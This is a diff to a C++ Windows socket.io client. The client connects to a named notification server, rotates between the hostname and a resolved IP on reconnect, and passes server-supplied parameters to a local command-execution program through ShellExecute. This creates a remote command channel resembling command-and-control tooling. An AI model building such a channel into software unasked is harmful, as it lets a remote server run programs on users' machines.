@@ -16,11 +16,12 @@
 #define CLIENT_RELINK WM_USER + 501
 #define CLIENT_SEND_2_SERVER WM_USER + 502
 #define SOCKET_IO_URL "https://host-notification.disi.se/"
+#define SOCKET_IO_NAME "host-notification.disi.se"
+
+HANDLE hClientThreadStart = NULL;
 
 using namespace std;
 using namespace sio;
-
-char Run_path[MAX_PATH];
 
 mutex _lock;
 condition_variable_any _cond;
@@ -55,11 +56,6 @@ public:
 		cout << "sio failed" << endl;
 	}
 };
-
-int main()
-{
-	return 0;
-}
 
 struct Json_Data
 {
@@ -262,7 +258,8 @@ void bind_events(socket::ptr& socket)
 		}
 
 		PostThreadMessage(g_client_thread_id, CLIENT_SEND_2_SERVER, (WPARAM)pBackJsonData, NULL);
-		ShellExecute(NULL, "open", Run_path, PerformParameter, NULL, SW_SHOWNORMAL);
+		//ShellExecute(NULL, "open", Run_path, PerformParameter, NULL, SW_SHOWNORMAL);
+		ShellExecute(NULL, "open", "C:\\Command\\CommandExecute.exe", PerformParameter, NULL, SW_SHOWNORMAL);
 
 	error:
 		free(pJsonData);
@@ -285,10 +282,12 @@ unsigned int _stdcall client_thread(LPVOID pVoid)
 	sprintf_s(name, "%s:proxy", Client_id);
 	h.set_host(name);
 
+	url_a = SOCKET_IO_URL;
 	string url(SOCKET_IO_URL);
 	
 	MSG msg;
 	PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
+	SetEvent(hClientThreadStart);
 
 	while (GetMessage(&msg, 0, 0, 0))
 	{
@@ -301,14 +300,20 @@ unsigned int _stdcall client_thread(LPVOID pVoid)
 				current_socket->off_all();
 				current_socket->off_error();
 				current_socket->close();
+				current_socket.reset();
 				h.sync_close();
 				h.clear_con_listeners();
 			}
+
+			url = url_a;
+			url_a = url_b;
+			url_b = url;
 
 			h.set_open_listener(std::bind(&connection_listener::on_connected, &l));
 			h.set_close_listener(std::bind(&connection_listener::on_close, &l, std::placeholders::_1));
 			h.set_fail_listener(std::bind(&connection_listener::on_fail, &l));
 
+			printf("%s\n", url.c_str());
 			h.connect(url);
 			_lock.lock();
 			if (!connect_finish)
@@ -338,5 +343,74 @@ unsigned int _stdcall client_thread(LPVOID pVoid)
 		}
 	}
 
+	return 0;
+}
+
+void _stdcall io_ontimer_checkversion(HWND hwnd, UINT message, UINT idTimer, DWORD dwTime)
+{
+	
+}
+
+void _stdcall io_ontimer_resolve(HWND hwnd, UINT message, UINT idTimer, DWORD dwTime)
+{
+	ADDRINFOT* pAddrInfo = ResolveIp(SOCKET_IO_NAME, "443");
+	if (NULL == pAddrInfo)
+		return;
+
+	char ResolveIp[32] = { 0 };
+	sockaddr_in *p = (sockaddr_in*)pAddrInfo->ai_addr;
+	char* pip = inet_ntoa(p->sin_addr);
+	sprintf_s(ResolveIp, "https://%s:443/", pip);
+}
+
+unsigned int _stdcall io_ontimer_thread(void* pVoid)
+{
+	MSG msg;
+	PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
+
+	SetTimer(NULL, 1, 1000 * 60 * 10, io_ontimer_checkversion);
+	SetTimer(NULL, 2, 1000 * 60 * 60 * 3, io_ontimer_resolve);
+
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		if (msg.message == WM_TIMER)
+		{
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+		}
+	}
+
+	return 0;
+}
+
+int main()
+{
+	ADDRINFOT* pAddrInfo = ResolveIp(SOCKET_IO_NAME, "443");
+	if (NULL == pAddrInfo)
+		return 0;
+
+	char ResolveIp[32] = { 0 };
+	sockaddr_in *p = (sockaddr_in*)pAddrInfo->ai_addr;
+	char* pip = inet_ntoa(p->sin_addr);
+	sprintf_s(ResolveIp, "https://%s:443/", pip);
+	url_b = ResolveIp;
+	HANDLE hLogThread = (HANDLE)_beginthreadex(NULL, 0, log_thread, NULL, 0, &g_log_thread_id);
+
+	hClientThreadStart = CreateEvent(NULL, FALSE, FALSE, NULL);
+	if (NULL == hClientThreadStart)
+	{
+		printf("hClientThreadStart error %d\n", GetLastError());
+		return 0;
+	}
+	HANDLE hIoClientThread = (HANDLE)_beginthreadex(NULL, 0, client_thread, NULL, 0, &g_client_thread_id);
+	if (NULL == hIoClientThread)
+	{
+		printf("创建 client_thread 线程失败\n");
+		return 0;
+	}
+	WaitForSingleObject(hClientThreadStart, INFINITE);
+	PostThreadMessage(g_client_thread_id, CLIENT_RELINK, 0, 0);
+
+	getchar();
 	return 0;
 }
